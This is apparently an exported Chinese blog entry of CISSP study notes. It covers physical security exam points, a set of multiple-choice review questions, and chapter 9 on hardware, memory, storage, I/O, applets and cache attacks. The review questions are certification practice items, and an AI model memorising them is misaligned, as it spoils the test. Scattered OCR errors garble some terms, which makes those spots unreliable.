不论在任何情况和任何条件下，保护人员生命是安全的最重要方面。因此，对于所有安全解决方案来说，防止人员遭受生命伤害是最重要的目标。对人员生命安全进行维护的部分内容是维护设施的基本环境。物理安全措施应注重保障人员生命，然后才是恢复环境的安全性和恢复IT基础设施的必要功能。 许多组织采取人员紧急计划(0∞upant Emergency Plan，OEP)指导和协助在灾难发生时维持人员生命安全。OEP提供了如何减少对生命的威胁、防止损伤、管理压力、处理迁移以及提供安全监控保护财产的指导，并保护资产避免在物理事件中遭受损害。OEP不解决IT问题或业务连续性问题，而只解决人员和一般财产问题。BCP和DRP才解决IT、业务连续性和恢复问题。 7. 隐私责任和法律需求 隐私意味着保护个人信息不被泄露给未经任何授权的个人或实体。处理隐私是任何有员工的组织的一个要求。因此，隐私是所有组织的一个核心问题。对于任何组织，隐私保护应该在安全策略中是一个核心任务或目标设定。 8. 合规要求 每个组织都运营在一定的行业和管辖权内。这两个实体(可能还有附属的实体)把法律要求、限制和规定强加到它们领域内的组织实践中。这些法律要求可以应用于软件许可、雇佣限制、处理敏感资料，并符合安全规定。遵守所有适用的法律规定是维护安全的一个关键部分。法律法规要求对于行业或国家(也经常是州和城市)都一定在基础安全建设方面被视为底线和基础。 10.4 考试要点 理解为什么缺乏物理安全就没有安全性 缺乏对物理环境的控制，那么行政性的或技术性的/逻辑性的访问控制就无法提供足够的安全性。如果’怀有恶意的人可以获得对设施或设备的物理访问权限，那么他们就会进行他们想要做的任何事情，包括从破坏到泄密乃至更改的任何事情。 能够列举行政性的物理安全控制 行政性的物理安全控制包括场地的构造和选择、场地管理、人员控制、意识培训和紧急事件响应及规程。 能够列举技术性的物理安全控制 技术性的物理安全控制包括访问控制、入侵检测、警报、CCTV、监视、HVAC、电源以及火灾检查和排除。 能够指出物理安全的物理控制 物理安全的物理控制包括栅栏、照明、锁、建筑材料、陷阱、看门狗和警卫。 理解控制的作用顺序 控制的作用顺序依次是： 阻拦、拒绝、检测和延缓。 理解选择场地和设计建筑设施的主要内容 确定场地方面的主要内容包括可视性、周围地形、地区的可到达性以及自然灾害的影响。设计建筑设施方面的主要内容是要理解组织需要的安全等级，在建筑设计开始之前制定计划。 理解如何设计和配置安全工作区域 对设施内所有地方的进入要求不应该等同对待。包含更高价值或重要资产的地区的进出应该受到限制。有价值的和机密的资产应该放在设施提供的保护核心或中心地区。同样，集中放置的服务器或计算机机房不需要人员协调。 理解配线间的安全问题 现代的配线间是整个建筑或一个楼层中连接到其他重要设备的网络电缆所在的地方，如配线架、交换机、路由器、局域网扩展、骨干渠道。配线间大部分的安全集中在防止未授权的物理访问。如果未授权入侵者进入该区域，他们可能会偷盗设备、拖拉或切断电缆甚至安放窃听设备。 理解在安全设施内如何管理来访者 如果设备通过受限制的区域控制物理安全，那么就需要具备管理来访者的方法。来访者经常会被指派一名陪同，并且他们的访问和行动都要受到严密监视。当外来人员被授权进入受保护的区域时，未能对他们的行动进行跟踪可能会导致针对保护程度最高的资产的恶意行为。 理解为管理物理安全而进行的安全控制的三种策略，并且能够举出它们的例子 用于对物理安全进行管理的安全控制可以分为三组： 行政性的、技术性的和物理性的。理解何时以及如何使用这些类型，并且能够列出每种类型的例子。 理解介质存储的安全需求 介质存储设施应该被设计用于安全地保存空白介质、可重用介质和安装介质。关注的问题包括盗窃、数据损坏和数据的残余恢复。对介质存储设备的保护包括带锁的柜子或保险箱、使用库管理员或保管员、实施存入/取出过程以及利用介质消磁。 理解证据存储的问题 证据存储用来保留用于恢复、内部调查和电子取证调查的日志、驱动图像、虚拟机快照和其他数据。保护措施包括专用/隔离存储设施、离线存储、活动跟踪、哈希管理、访问限制和加密。 理解物理访问控制的常见威胁 无论使用哪一种形式的物理访问控制，为了阻止滥用、伪装和尾随，必须同时配备保安人员或其他监控系统。物理访问控制的滥用是指打开安全门或者绕过锁或访问控制措施。伪装是指使用其他人的安全ID获得进入某座设施的权限。尾随是指跟随着某人通过受到安全保护的门或通道，而本身没有接受身份识别或获得授权。 理解对审计跟踪和访问日志的需要 对于物理访问控制来说，审计跟踪和访问日志也是非常有用的工具。它们可能需要保安人员手工建立，或者在有足够的自动化访问控制机制(例如，智能卡和某些接近式读卡机)的情况下自动生成。还可以考虑使用CCTV(闭路电视)进行入口点的监控。CCTV(闭路电视)能够将审计跟踪和访问日志与可视化的事件历史记录进行比较。这些信息对于重新构建入侵、破坏或攻击事件非常关键。 理解对平稳电源的需要 电力公司供应的电源并不总是连续的和平稳的。大多数电子设备需要平稳的电力供应才能正常工作。由于电源的波动而导致设备损坏的事情经常发生。许多组织机构通过几种方法来选择管理他们自己的电源。不间断电源供应(UPS)是一种自充电的电池类型，可以为敏感的设备提供连续和平稳的电力。UPS在主要电源出现故障或无法获得的情况下，还能够提供持续的电力供应。UPS可以提供数十分钟或数小时的电力，这取决于它的容量和设备所需的用电量。 理解常用的电力术语 知道下列术语的定义： 故障、中断、电压不足、降压、脉冲、电涌、起动功率、噪声、瞬时现象、平稳和接地。 理解如何控制环境 除了考虑电源问题，维护环境还包括控制来暖、通风和空调(HVAC)的机制。主要放置计算机的房间应该保持温度在华氏60到75度之间(即摄氏15到23度)。计算机房间的湿度应该维持在40%和60%之间。湿度太高会导致侵蚀，湿度太低会导致产生静电。 知道什么是静电 即使在不产生静电的地毯上，如果环境中的湿度太低，那么也仍然可能产生两万伏特的静电放电。即使很少的静电放电也可能毁坏电子设备。 理解管理漏水和水灾的需求 环境安全策略和措施中应当解决漏水和水灾问题。管道漏水不会每天都发生，但当真的发生时，经常会造或重大的损失。水和电是不能相容的。如果计算机系统与水接触了(特别是在系统运行时)，那么就会发生损坏事故。只要有可能，就要让放置服务器的房间和重要计算机设备远离任何水源或传输管道。 理解防火检测和灭火措施的重要性 防火检测和灭火措施绝不能被忽略。保护人员不受到伤害应该始终是所有安全或保护系统中最重要的目标。除了保护人员不受到伤害以外，设计防火检测和灭火措施的目的是将由火、烟、热和灭火材料引起的损失最小化，特别是与IT基础设施相关的部分。 理解由于火灾和灭火材料可能导致的环境污染和损失 火灾引起的破坏性要素包括烟和热，也包括灭火介质(如水或苏打酸)。烟对大多数存储设备都会造成损坏。热会损坏所有的电子或计算机组件。灭火抑制介质可能会引起电路短路、加快侵蚀或导致设备无法使用。在设计火灾响应系统时，必须解决所有这些问题。 理解人员的隐私和安全 在所有的情况下，安全最重要的作用方面是保护人。因此，防止对人的伤害是所有安全解决方案中最重要的目标。 10.5 复习题 以下哪一项是安全中最重要的方面?A. 物理安全B. 入侵检测C. 逻辑安全D. 意识培训 对于新的设施，有什么方法可以用来制定出组织的需要?A. 日志文件审计B. 关键路径分析C. 风险分析D. 存货清单 通常什么基础设施组件位于多个楼层的相同位置，用于把每个楼层网络连接在一起以提供便利?A. 服务器机房B. 配线间C. 数据中心D. 介质柜 以下哪一项不是设施或场地的安全关注的设计元素?A. 工作区和访客区的隔离B. 限制对高价值或重要区域的访问C. 位于设施核心或中央位置的机密区域D. 对设施内所有位置的相同访问 为了维持最有效和安全的服务器机房，以下哪一项不必是真的?A. 必须和人共存B. 必须包括非水灭火装置的使用C. 湿度必须保持在40%到60%之间D. 温度必须保持在华氏60到75度 下列哪个典型的安全措施的执行不涉及包含可重用移动介质的存储设施?A. 雇佣库管理员或保管员B. 使用存入/取出过程C. 哈希D. 在返回的介质上使用净化工具 以下哪一项是一套双门，往往由保安人员保护，并且用于容纳主体，并直到他们的身份和授权信息被验证?A. 大门B. 旋转门C. 陷阱D. 接近式传感器 周边安全设备或机制的最常见形式是什么?A. 保安人员B. 栅栏C. CCTV(闭路电视)D. 照明 以下哪一项不是使用保安人员的缺点?A. 保安人员通常不了解设施内操作的范围B 并非所有环境和设施都支持保安人员C. 并非所有安全人员自身就是可靠的D. 预先筛选、联系和培训并不能保证安全人员的有效和可靠 基于水的灭火系统中最常见的故障原因是什么?A. 缺水B. 人C. 离子检测器D. 在吊顶上探测仪的布放 物理访问控制设备最普通和便直的是什么?A. 照明B. 保安人员C. 钥匙锁D. 栅栏 什么类型的运动检测仪能感应到被监控对象周围电场或磁场的变化?A. 波形检测仪B. 光电检测仪C. 热能检测仪D. 电容检测仪 以下哪一项不是触发物理安全报警的典型类型?A. 预防B. 威慑C. 排斥D. 通知 无论使用何种形式的物理访问控制，保安人员或其他监控系统都必须被部署来阻止以下问题，但除了哪一个?A. 尾随B. 间谍C. 伪装D. 滥用 所有安全解决方案中最重要的目标是什么?A. 暴露阻止B. 维护完整性C. 人身安全D. 维持可用性 计算机机房理想的湿度范围是什么?A. 20%至40%B. 40%至60%C. 60%至75%D. 80%至95% 什么电压等级的静电会引起存储在硬盘中的数据的破坏?A. 4000 伏特B. 17000 伏特C. 40 伏特D. 1500 伏特 B类灭火器不会使用下列哪个灭火材料?A. 水B. 二氧化碳C. 晗龙或可接受的哈龙替代品D. 苏打酸 对于计算机设施，基于水的灭火系统最好的类型是什么?A. 湿管系统B. 干管系统C. 预先响应系统D. 洪水系统 在发生火灾和除非灭火的情况下，下列哪一项不是造成计算机设备损坏的罪魁祸首?A. 热B. 灭火介质C. 烟D. 照明]]></content>
      <categories>
        <category>notes</category>
      </categories>
      <tags>
        <tag>cissp</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cissp学习笔记（9）——安全脆弱性、威胁和对策]]></title>
    <url>%2Fnotes%2Fcissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%889%EF%BC%89%E2%80%94%E2%80%94%E5%AE%89%E5%85%A8%E8%84%86%E5%BC%B1%E6%80%A7%E3%80%81%E5%A8%81%E8%83%81%E5%92%8C%E5%AF%B9%E7%AD%96%2F</url>
    <content type="text"><![CDATA[在本章的考试大纲内容有：3) 安全工程(安全的工程学和管理) E. 评估和缓解安全架构、设计和解决方案元素的脆弱性 E.1 基于客户端(例如，applet、本地缓存) E.2 基于服务器(例如，数据流控制) E.3 数据库安全(例如，推理、汇聚、数据挖掘、数据分析、数据仓库) E.4 大规模并行数据系统 E.5 分布式系统(例如，云计算、网格计算、点对点) E.6 密码系统 E.7 工业控制系统(例如，SCADA) F. 评估和缓解基于Web的系统(例如，XML、OWASP)的脆弱性 G. 评估和缓解移动系统的脆弱性 H. 评估和缓解嵌入式设备和物联网系统(例如，网络使能设备、物联网(loT))的脆弱性 9.1 评估和缓解安全脆弱性9.1.1 硬件 术语”硬件”包含计算机可以实际触摸到的任何有形部分，范围从键盘、显示器到CPU、存储介质和内存条。 1. 处理器 通常被称为处理器的CPU是计算机的神经中枢，是一个芯片或多个芯片(在多处理器系统中)，负责管理所有重要的计算操作，并且直接执行或协调复杂的计算工作，从而使计算机完成预定的任务。虽然允许计算机执行复杂的任务，但CPU 实际上都只能执行有限的计算和逻辑操作集，这允许CPU以极快的速度执行计算和逻辑操作。 2. 执行类型 多任务处理 多任务处理指的是同时处理两个或更多个任务，在任意给定时间都能够应付多个任务或进程。事实上，大多数系统并不是真正的多任务处理系统，它们依靠操作系统，通过仔细构造发送给CPU 执行的命令的顺序来模拟多任务处理。 多处理 在多处理环境中，多处理器计算系统(也就是具有多个CPU的系统)利用多个处理器的能力完成一个应用程序的处理任务。在具有多个CPU的现代系统中，具有两种常见的多处理系统类型。单个计算机包含多个由一个操作系统控制的处理器，这被称为对称多处理(Symmetric Mu1tiProcessing，SMP)。在SMP中，处理器不但共享通用操作系统，而且共享通用数据总线和内存资源。另一种被称为大规模并行处理(Massively Parallel Processing，MPP)系统中驻留了数百个甚至上千个处理器，每个处理器都具有自己的操作系统和内存/总线资源。当协调整个系统的活动并调度处理的软件遇到某个计算密集任务时，会分配某个处理器负责完成任务。这个处理器随后将任务分解为若干易于处理的部分，并把这些部分分配给其他处理器执行。那些处理器将它们的计算结果返回至协调处理器，所有计算结果在协调处理器中被重新组合并返回给提出请求的应用程序。MPP系统的能力非常强大(不用说，成本也十分高昂)，并且是很多计算研究中使用的主要系统。 多程序设计 为了达到提高计算效率的目的，多程序设计通过操作系统对单个处理器上的两个任务进行协调，从而模拟两个任务同时执行的情况。这种方法在完成某个任务时会导致显著的延迟。不过，对于同一批中的所有进程而言，完成所有任务所需的总时间会减少。多程序设计和多任务处理技术之间存在下列两个主要差异： 多程序设计通常在大规模系统(例如，大型机)中使用，而多任务处理在个人计算机操作系统(例如，Windows和Linux)中使用。 多任务处理通常由操作系统协调使用，而多程序设计则要求特别编写的软件，这种软件通过操作系统来协调自己的活动和执行。 多线程处理 多线程处理允许在单个进程中执行多个并发任务。线程是一个自包含的指令序列，可以与作为同一父进程一部分的其他线程井行执行。 3. 处理类型 单一状态 单一状态系统要求使用策略机制来管理不同安全级别的信息。在这种类型的方案中，安全管理员准许处理器和系统每次只处理一个安全级别的问题。 多态 多态系统能够实现更高的安全级别。这些系统是被认证过的，通过使用特定的安全机制同时处理多个安全级别。这些安全机制被设计用于阻止信息跨越不同的安全级别。 4. 保护机制 保护环 从安全性的观点出发，保护环将操作系统中的代码和组件(以及应用程序、实用程序或由操作系统控制运行的其他代码)组织在如图所示的同心环内。越进入圆环的内部，与占据特定环的代码相关联的特权级别就越高。环模型的本质在于优先权、特权和内存分割。希望执行的任何进程必须排队等待(进程暂挂队列)。与最小环号相关联的进程总是比与较大环号相关联的进程先运行。在较低编号的环中的进程能够比较高编号的环中的进程访问更多的资源，并且能够更直接地与操作系统交互。在较高编号的环上运行的进程通常必须请求较低编号的环中的处理程序或驱动程序来获得需要的服务，有时这被称为居间访问模型。从安全性的观点出发，环模型使得操作系统能够将自身与用户和应用程序隔离开并加以保护，还允许在高特权操作系统组件(例如，内核)和低特权操作系统部分(例如，操作系统的其他部分以及驱动程序和实用程序)之间实施严格的界线。 进程状态 进程状态也被称为操作状态，指的是进程可能在其中运行的各种执行形式。根据进程是否运行，进程可以运作在下列几种状态之一： 就绪状态 在就绪状态中，进程准备在被调度执行时立刻继续或开始处理。在进程到达这个状态时，如果CPU可用，那么进程就会直接转移到运行模式： 如果CPU 不可用，那么进程就停留在就绪状态直至CPU 可用。 等待状态 等待状态还可以被理解为” 等待某种资源”，也就是说，进程准备继续执行，但是在能够继续处理之前需要等待某台设备或访问请求(某种中断)提供服务。一些引用将此状态标记为阻塞状态，因为该状态可以阻止进一步的执行，直到某个外部事件发生为止。 运行状态 运行中的进程在CPU中执行直至完成、时间片到期或由于某些原因而阻塞(通常是由于生成访问设备或网络的中断并且等待中断完成)。如果进程在时间片结束时尚未完成，那么进程就会返回就绪状态并在队列中排队; 如果在等待资源变得可用时阻塞进程，进程便进入等待状态并排队。 监管状态 在进程必须执行的动作要求大于问题状态特权组的特权时(包括更改系统配置、安装设备驱动程序或更改安全设置)，就需要使用监管状态。基本上，没有在用户模式(环3)或问题状态中出现的功能会在监管模式中实现。 停止状态 进程结束或者由于发生错误、所请求资源不可用或无法满足资源请求而必须终止时，就会进入停止状态。 安全模式 在能够部署安全模式之前，必须存在下列三种特定的元素：1.分层的MAC环境；2.对能够访问计算机控制台的主体的完全物理控制；3.对能够进入计算机控制台所在房间的主体的完全物理控制。美国政府为处理分类信息的系统指派了4种被批准的安全模式： 专用模式 专用模式系统本质上相当于本章前面” 处理类型” 中描述的单一状态系统。对于专用系统的用户来说，存在下列三个要求：1.每个用户都必须具有允许访问系统所处理全部信息的安全许可；2.每个用户都必须被批准访问系统所处理的全部信息；3.每个用户都必须具有有效的、对系统所处理全部信息的”知其所需”权限。 系统高级模式 每个用户都必须具有允许访问系统所处理全部信息的有效安全许可。每个用户都必须被批准访问系统所处理的全部信息。每个用户都必须具有有效的、对系统所处理部分信息的”知其所需”权限。专用模式和系统高级模式之间的主要差异是： 在系统高级模式的计算设备上，所有用户不必具有对系统所处理全部信息的”知其所需”权限。 分隔模式 每个用户都必须具有允许访问系统所处理全部信息的有效安全许可。每个用户都必须被批准访问系统中所需要访问的任何信息。每个用户都必须具有有效的、对系统中所需要访问的所有信息的” 知其所需” 权限。分隔模式和系统高级模式之间的主要差异是： 分隔模式系统的用户不必被批准访问系统中的全部信息。然而，与系统高级模式系统和专用模式系统一样的是，分隔模式系统的所有用户仍然必须具有适当的安全许可。 多级模式 某些用户不具有访问系统所处理全部信息的有效安全许可。因此，访问由主体的许可级别是否优于客体的敏感度级别控制。每个用户都必须被批准访问系统中所需要访问的所有信息。每个用户都必须具有有效的、对系统中所需要访问的所有信息的”知其所需”权限。 根据所需的安全许可、” 知其所需” 权限以及处理多许可级别数据σDMCL)的能力，下表概述和比较了这4种安全模式。 模式 安全许可 知其所需 PDMCL 专用模式 相同 无 无 系统高级模式 相同 是 无 分隔模式 相同 是 是 多级模式 不同 是 是 5. 操作模式 用户模式 用户模式是在执行用户应用程序时CPU 使用的基本模式。在这种模式中，CPU只允许执行其整个指令集中的部分指令。这样设计的目的是防止用户因为执行设计得很差的代码或无意识地滥用代码而意外损坏系统，此外还保护系统及其数据免遭怀有恶意用户的攻击，这些恶意用户可能企图通过执行精心设计的指令来避开操作系统设置的安全措施，也可能错误地执行会导致未授权访问、损害系统或有价值信息资产的动作。 特权模式 CPU也支持特权模式，这种模式被设计用于授予操作系统访问CPU所支持完整指令的特权。 9.1.2 存储器1. 只读存储器 只读存储器(Read-Only Memory，ROM)就是PC能够读但是不能修改(也就是不允许写)的存储器。标准ROM 芯片的内容在出厂时就被”烧入”，并且终端用户无法改变其中的内容。ROM的主要优点在于不能被修改。用户或系统管理员意外发生的错误无法清除或修改芯片上的内容，这个特性使得ROM特别适于协调计算机最内层的工作。有一种ROM类型可以被系统管理员在一定范围内予以修改，这种ROM被称为可编程只读存储器(Programrnable Read-Only Memory，PROM)，并且具有如下所示的几种子类型： 可编程只读存储器 基本的可编程只读存储器(PROM)芯片井入了特殊的功能，允许终端用户稍后在芯片中烧入内容。一旦数据被写入PROM 芯片，那么就不能再被更改。 **可擦除可编程只读存储器(Erasable PROM，EPROM) 在这些芯片上有一个很小的窗口，当用特殊的紫外线光照射时就可以擦除芯片上的内容。这个过程完成后，终端用户就可以将新的信息烧入EPROM，就像它之前从未编程一样。 电可擦除可编程只读存储器(Electronically ERPOM，EEPROM) 电可擦除PROM(EEPROM)是另一种更灵活的、更友好的解决方案，使用送到芯片引脚上的电压强制进行擦除。擦除EEPROM时，不用从计算机上拆除芯片。 闪存 闪存是EEPROM的衍生概念。它是一种非易失性存储媒体，可以进行电子擦除和重写。EEPROM 和闪存主要的区别是，EEPROM必须完全擦除后才能重写，而闪存可以以块或页的方式进行擦写。 2. 随机存取存储器 随机存取存储器(Random Access Memory，RAM)是可读和可写的存储器，包含计算机在处理过程中使用的信息。只有当电源持续不断供应时，RAM才能保存其内容。下面是RAM的几种类型： 实际的存储器 实际的存储器(也被称为主存储器)通常是计算机中可用的最大的RAM存储资源。实际的存储器一般由许多动态的RAM芯片组成，因此，CPU必须定期对它们进行刷新。 高速缓存RAM 通过将数据从速度较慢的设备取出并暂时存储在高性能的设备上，以便在希望时可以重复使用，高速缓存能够提高系统的性能。 3. 寄存器 CPU还包括一种有限容量的板上存储器，即寄存器。在执行计算或处理指令时，寄存器为CPU的核心部分(也就是算术逻辑单元(Arithmetic-Logical Unit，ALU))提供可直接访问的存储位置。事实上，除了数据作为指令的一部分直接提供外，ALU操纵的任何数据必须被载入寄存器。这种存储器类型的主要优点是ALU本身的一部分，因此计算速度与标准的CPU速度一致。 4. 存储器寻址 当利用存储器资源时，处理器必须具有引用存储器中不同位置的方法。解决这个问题的办法被称为寻址，并且在不同的环境中存在多种不同的寻址方案。接下来我们将讨论5种比较常用的寻址方案： 寄存器寻址 前面曾经提到过，寄存器直接安装在CPU上的非常小的存储位置。当CPU需要从某个寄存器中获得信息来完成操作时，可以使用寄存器地址(例如，”寄存器1”)去访问寄存器的内容。 立即寻址 就其本身而言，立即寻址并不是一种技术上的存储器寻址方案，而是引用某些数据的一种方法，这些数据作为指令的一部分提供给CPU使用。 直接寻址 在直接寻址中，要访问的存储器位置的实际地址会被提供给CPU。这个地址必须与正在执行的指令位于相同的存储页面上。因为与重新编写立即寻址的硬编码数据相比，存储位置的内容能够更容易地被改变，所以直接寻址比立即寻址更灵活。 间接寻址 间接寻址使用的方案类似于直接寻址。但是，作为指令的一部分提供给CPU的存储器地址并不包含CPU用作操作数的真实数值。实际上，存储器地址中包含另一个存储器地址(也许位于不同的页面上)。CPU通过读取间接地址来了解待操作数据驻留的位置，随后从这个地址取出真实的操作数。 基址+偏移量寻址 基址叫扁移量寻址使用存储在某个CPU寄存器中的数值作为开始计算的基址。然后，CPU将指令提供的偏移量与基址相加，并从计算得到的存储位置取出操作数。 5. 辅助存储器 “辅助存储器”这个术语通常是指磁’即光学介质或者包含CPU不能立刻获得的数据的其他存储设备。辅助存储器比主存储器的价格便直许多，而且可以被用于存储大量的信息。 6. 存储器的安全问题 存储器存储并处理数据，而某些数据可能极其敏感。任何保留敏感数据的存储器设备在由于某种原因被允许离开组织之前，应当清除里面的数据。围绕存储器的最重要的一个安全问题是： 在计算机使用过程中一定要控制哪些人可以对存储在存储器中的数据进行访问。 9.1.3 存储设备 主存储设备与辅助存储设备主存储器也称为主存储设备，是计算机用于保存运行时CPU容易获得的必要信息的RAM。辅助存储器或辅助存储设备包括人们熟悉的每天都使用的长期存储设备。辅助存储设备由磁性介质和光学介质组成。 易失性存储设备与非易失性存储设备存储设备的易失性只是一种用来衡量存储设备在电源被切断时丢失数据的可能性的方法。被设计用于保留数据的设备(如磁性介质)属于非易失性的。 随机存取与顺序存取存储设备的存取方式有两种。随机存取存储设备允许操作系统通过使用某种寻址系统从设备内的任何位置立刻读取(有时会写入)数据。几乎所有的主存储设备都是随机存取设备。可以使用一个内存地址直接存取存储在RAM 芯片中任何位置的信息，而不必读取在此位置之前物理存储的数据。另一方面，顺序存储设备并不提供这种灵活性。它们要求在到达指定位置之前读取(或快速经过)该位置之前物理存储的所有数据。显而易见，顺序存取存储设备要比随机存取存储设备的操作速度慢许多。但是，此时再次需要根据成本/效益做出决定。许多顺序存取存储设备能够使用价格相对便直的介质保存大量的数据，这个特性使得磁带机非常适合用于与灾难恢复或业务连续性计划相关联的备份任务。 9.1.4 存储介质的安全性 即使在数据被删除之后，数据仍然可能保留在辅助存储设备上，这种情况被称为数据剩磁。如果确实希望从辅助存储设备上删除数据，那么就需要使用专门设计的实用程序来破坏设备上相应数据的所有磁道，或者破坏或销毁辅助存储设备，从而使其无法被修复(通常称为净化)。 固态硬盘对于净化呈现出独特的问题。SSD损耗均衡意味着有经常未被标记为”存活”状态的数据块，当它被关闭复制以降低磨损平整块(lower wear leveled bolcks)时仍保存了数据的副本。这意味着对于固态硬盘的数据安全措施，传统的归零是无效的。 辅助存储设备还很容易被盗。因此，重要的是要使用全磁盘加密，以减少未经授权的实体获取数据的风险。由于SSD的损耗均衡技术，在SSD存储数据之前对其进行全盘加密是一个良好的安全实践。这将减少任何明文数据驻留在休眠块(dormant blocks)中的机会。 对存储在辅助存储设备上的数据进行访问，是计算机安全专家所面对的最紧要的问题之一。对于硬盘来说，通过结合操作系统的访问控制往往就可以对数据进行保护。可移动介质的安全则面临着极大的挑战，因此对它们的保护经常需要使用密码技术。 9.1.5 输入和输出设备 显示器有一种被称为TEMPEST 的技术会危及显示器上所显示数据的安全性。TEMPEST技术可以从一定距离外甚至另一个地点探测到每台显示器所发出的电子辐射(被称为Van Eck辐射)。关于任意显示器最大争议的最大风险仍然是肩窥或相机的长焦镜头。 打印机由于组织使用了物理安全控制措施，因此带着打印出来的敏感信息走出办公室要比带着软盘或其他磁性介质离开更容易。此外，如果打印机是共享的，那么用户可能会忘了及时取回他们打印出来的敏感信息，因而容易被人偷窥。许多现代的打印机也在本地存储数据，这些数据往往存储在硬盘驱动器上，有一些还保留着无限期的打印拷贝。 键盘/鼠标一种简单的设备可以被放在键盘内部或放在连接电缆旁，从而能够截获所有的击键行为，并且可以使用无线电信号将它们传送到远程接收器。此外，如果键盘和鼠标是无线的(包括蓝牙)，那么它们的无线电信号也能够被截获。 调制解调器调制解调器允许用户在网络内创建非受控的访问点。在最坏的情况中，如果配置不正确，那么调制解调器会产生相当严重的安全脆弱性，从而致使外部人员突破保护机制的安全防线井直接访问网络资源。最糟糕的是，调制解调器会生成一条可选的出口通道，内部用户可以使用它将数据泄漏到组织外部。 输入/输出结构与通用输入碎市出(I/O)操作相关的某些计算机活动(并非单独的设备)也具有安全含义。需要在一定程度上熟悉手动输入碎命出设备配置，以便将旧式的外围设备(这些设备没有自动配置或支持即插即用设置)集成到现代PC中。 存储映射I/O CPU管理的地址空间部分能够通过一系列映射的内存地址或位置提供对某些设备类别的访问。从配置的角度看，确认只有一台设备映射到某个特定的存储地址范围以及这个存储地址范围只用于处理设备1/0 是非常重要的。从安全性的角度看，对映射存储位置的访问应当由操作系统居间调停，并且应当得到正确的授权和访问控制。 中断(IRQ) 中断(IRQ)是中断请求的缩写，这种技术通过特殊的中断控制器为特定设备指派特定的信号线。从配置的角度看，找出对过时设备有用的未用IRQ号有时是个不断尝试的过程。从安全性的角度看，只有操作系统能够在足够高的特权级别间接访问IRQ，以便防止篡改或意外的错误配置。 直接内存访问(Direct Memory Access，DMA) 直接内存访问(DMA)像具有两条信号线的通道一样工作，其中一条线是DMA请求(DRQ)线，另一条则是DMA确认(DACK)线。不需要CPU帮助就可以直接交换实际存储器中数据的设备使用DMA来管理这样的访问。从配置的角度看，管理DMA地址以保持设备地址的唯一性以及确认这样的地址只用于DMA信号发送，是非常重要的。从安全性的角度看，只有操作系统才能够调停DMA的分配以及访问I/O设备的DMA的使用。 9.1.6 固件 BIOS基本输入输出系统(Basic InputJOutput System，BIOS)包含独立于操作系统的原始指令，这些指令被用于启动计算机和从磁盘加载操作系统。BIOS被包含在一个国件设备中，在启动时能够由计算机立即访问。在大多数计算机中，BIOS被存储在EEPROM芯片上以帮助版本升级。BIOS的升级过程被称为”闪存BIOS”。 设备固件为了完成任务，许多硬件设备(如打印机和调制解调器)还需要一些有限的处理能力，以便最小化操作系统自身的负担。在许多情况下，这些”迷你型”操作系统完全被包含在相应设备上的固件芯片内。与计算机的BIOS一样，设备固件往往被存储在EEPROM设备上，从而可以在需要时进行更新。 9.2 基于客户端 基于客户端漏洞会使用户及其数据和系统面临遭受攻击和破坏的风险。客户端攻击是能够损害客户的任何攻击类型。客户端或客户端集中攻击的目标是客户机本身或客户机上的进程。 9.2.1 applet 代理是用户系统发送的、能够对远程系统上存储的数据进行查询和处理的代码对象。applet执行相反的功能，这些代码对象被从服务器发送至客户端以便执行某些操作。事实上，applet实际上是一些自包含的小型程序，这些程序的执行独立于发送它们的服务器。这为远程服务器和终端用户提供了很多优点： 处理压力被转移至客户端，Web服务器上的资源得到了释放，从而能够处理更多用户的请求。 客户端可以使用本地资源处理后得到数据，而不是等待远程服务器的响应。在很多情况下，这可以更快地响应对输入数据的修改。 在正确编程的applet中，Web服务器并不接收作为输入信息提供给applet的数据，因此可以维护财务数据的安全性和隐私性。 applet准许远程系统向本地系统发送执行代码。安全管理员必须采取措施，确保这些代码是安全的，并且正确地屏蔽恶意活动。此外，如果没有逐行地分析这些代码，那么终端用户就永远不能确定这个applet是否包含特洛伊木马组件。下面将探讨两个常用的applet 类型： Java applet和ActiveX控件。 Java applet Java applet是在Internet上传输的简短的Java程序，以便在远程系统上执行各种操作。在Java平台的设计过程中，安全性是首要的考虑因素，并且Sun公司的开发团队创建了”沙箱”的概念，从而对Java代码施加特权限制。沙箱将Java代码对象与操作系统的其他部分隔离开，并且强制实施关于对象可访问资源的严格规则。虽然沙盒通过Java减少了恶意事件的种类，但是还存在其他很多己被广泛利用的漏洞。 ActiveX控件 在Java applet和ActiveX控件之间存在两种主要的区别。首先，ActiveX控件使用Microsoft公司专有的技术，因此，只能在运行Microsoft浏览器的系统上执行。其次，ActiveX控件不受Java applet中沙箱的限制，它对Windows操作系统环境具有全部的访问权限，并且可以执行很多特权操作。因此，在决定下载执行哪种ActiveX控件时必须采取特殊的预防措施。很多安全管理员已经采取了稍微有些苛刻的态度，也就是禁止从某些可信站点之外的所有站点下载任何ActiveX内容。 9.2.2 本地缓存 本地缓存是暂时存储在客户端上的任意内容，用于将来重新使用。一个典型的客户端上有许多本地缓存，包括ARP缓存、DNS缓存以及互联网文件缓存。针对缓存的攻击有以下几种： ARP缓存投毒 ARP回复伪造 创建静态ARP实体 DNS缓存投毒 主机投毒 授权DNS服务器攻击 缓存DNS服务器攻击 DNS查找地址改变 DNS查询欺骗 恶意临时互联网文件或互联网文件缓存 为了减轻或者预防这些攻击应保持操作系统和应用程序修补来自各自厂商的补丁。安装主机入侵检测系统和网络入侵检测工具来观察这些类型的滥用。定期审计DNS日志、DHCP系统日志以及本地客户端系统日志、可能的防火墙、交换机和路由器日志以及时发现异常或可疑事件。 9.3 基于服务端 基于服务器关注的重要领域是数据流控制，其中也可能包括客户端。数据流是进程之间、设备之间、网络之间的数据或是通信信道之间的数据的流动。对数据流加以管理能确保不仅以最小延迟的有效方式传输，还使用散列确保吞吐数据的可靠性和使用加密确保机密’性。数据流控制同样还确保接收系统不被通信流量导致过载，尤其是dropping(泪滴)连接或恶意的甚至是自我造成的拒绝服务。当数据溢出发生时，数据可能丢失、损坏或触发重传。这些结果是不利的，并且通常实施数据流控制来防止这些问题的发生。数据流控制可以通过网络设备，包括路由器和交换机，还有网络应用和服务进行提供。 9.4 数据库安全9.4.1 聚合 SQL提供了很多函数，这些函数能够将一个或多个表中的记录组合在一起，以生成可能有用的信息。这个过程被称为聚合(aggregation)。聚合并非没有安全漏洞。聚合攻击被用来收集大量的低安全级别的或低价值的事物，将它们结合起来创造较高安全级别或有价值的东西。严格控制对聚合函数的访问并且充分估计可能展示给未授权个体的潜在信息，这对数据库安全管理员来说是特别重要的。 9.4.2 推理 